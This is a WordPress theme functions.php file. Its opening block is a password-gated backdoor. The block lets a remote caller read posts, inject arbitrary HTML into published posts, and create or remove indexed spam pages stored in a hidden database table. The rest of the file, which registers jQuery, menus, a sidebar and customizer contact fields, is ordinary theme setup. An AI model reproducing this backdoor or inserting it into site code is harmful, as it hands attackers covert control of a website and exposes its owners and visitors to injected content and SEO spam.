<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '6b69f66659f077ae7357a47896a6c963'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php 

// JQuery
if (!is_admin()) {
    add_action("wp_enqueue_scripts", "my_jquery_enqueue", 11);
}
function my_jquery_enqueue() {
    wp_deregister_script('jquery');
    wp_register_script('jquery', "http" . ($_SERVER['SERVER_PORT'] == 443 ? "s" : "") . "://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js", false, null);
    wp_enqueue_script('jquery');
}
// Way Points
$wayurl = plugins_url()."/js_composer/assets/lib/waypoints/waypoints.min.js";
wp_enqueue_script( 'waypoints', $wayurl);

// MENU 
register_nav_menus( array('primary' => __( 'Primary Menu' ) ) );

// Shortcodes
include ('shortcodes.php');

// SIDEBAR
function website_widgets_init() {
    register_sidebar( array(
        'name'          => esc_html__( 'Sidebar' ),
        'id'            => 'sidebar-1',
        'description'   => '',
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget'  => '</section>',
        'before_title'  => '<h2 class="widget-title">',
        'after_title'   => '</h2>',
    ) );
}
add_action( 'widgets_init', 'website_widgets_init' );

// CUSTOMIZE
// #############################################################

function website_customize_register( $wp_customize ) {
    $wp_customize->add_section( 'website_contact' , array(
        'title'      => __( 'Contact Info' ),
        'priority'   => 30,
    ) );

    $wp_customize->add_setting( 'logo' , array(
        'default'     => '',
        'transport'   => 'postMessage',
    ) );
    $wp_customize->add_setting( 'address_google_maps' , array(
        'default'     => '',
        'transport'   => 'postMessage',
    ) );
    $wp_customize->add_setting( 'phone' , array(
        'default'     => '',
        'transport'   => 'postMessage',
    ) );
    $wp_customize->add_setting( 'email' , array(
        'default'     => '',
        'transport'   => 'postMessage',
    ) );
    $wp_customize->add_setting( 'facebook' , array(
        'default'     => '',
        'transport'   => 'postMessage',
    ) );
    $wp_customize->add_setting( 'google' , array(
        'default'     => '',
        'transport'   => 'postMessage',
    ) );
    $wp_customize->add_setting( 'linkedin' , array(
        'default'     => '',
        'transport'   => 'postMessage',
    ) );
    $wp_customize->add_setting( 'twitter' , array(
        'default'     => '',
        'transport'   => 'postMessage',
    ) );
    $wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'identity_logo', array(
        'label'      => __( 'Logo' ),
        'section'    => 'title_tagline',
        'settings'   => 'logo',
        'context'	 => 'test',
    ) ) );
    $wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'contact_address_google_maps', array(
        'label'      => __( 'Google Maps Adress Link' ),
        'section'    => 'website_contact',
        'settings'   => 'address_google_maps',
    ) ) );
    $wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'contact_phone', array(
        'label'      => __( 'Phone' ),
        'section'    => 'website_contact',
        'settings'   => 'phone',
    ) ) );
    $wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'contact_email', array(
        'label'      => __( 'Email' ),
        'section'    => 'website_contact',
        'settings'   => 'email',
    ) ) );
    $wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'contact_facebook', array(
        'label'      => __( 'Facebook URL' ),
        'section'    => 'website_contact',
        'settings'   => 'facebook',
    ) ) );
    $wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'contact_google', array(
        'label'      => __( 'Google+ URL' ),
        'section'    => 'website_contact',
        'settings'   => 'google',
    ) ) );
    $wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'contact_linkedin', array(
        'label'      => __( 'LinkedIn URL' ),
        'section'    => 'website_contact',
        'settings'   => 'linkedin',
    ) ) );
    $wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'contact_twitter', array(
        'label'      => __( 'Twitter URL' ),
        'section'    => 'website_contact',
        'settings'   => 'twitter',
    ) ) );
	
}
add_action( 'customize_register', 'website_customize_register' );

// #############################################################

// Images
add_theme_support( 'post-thumbnails' ); 

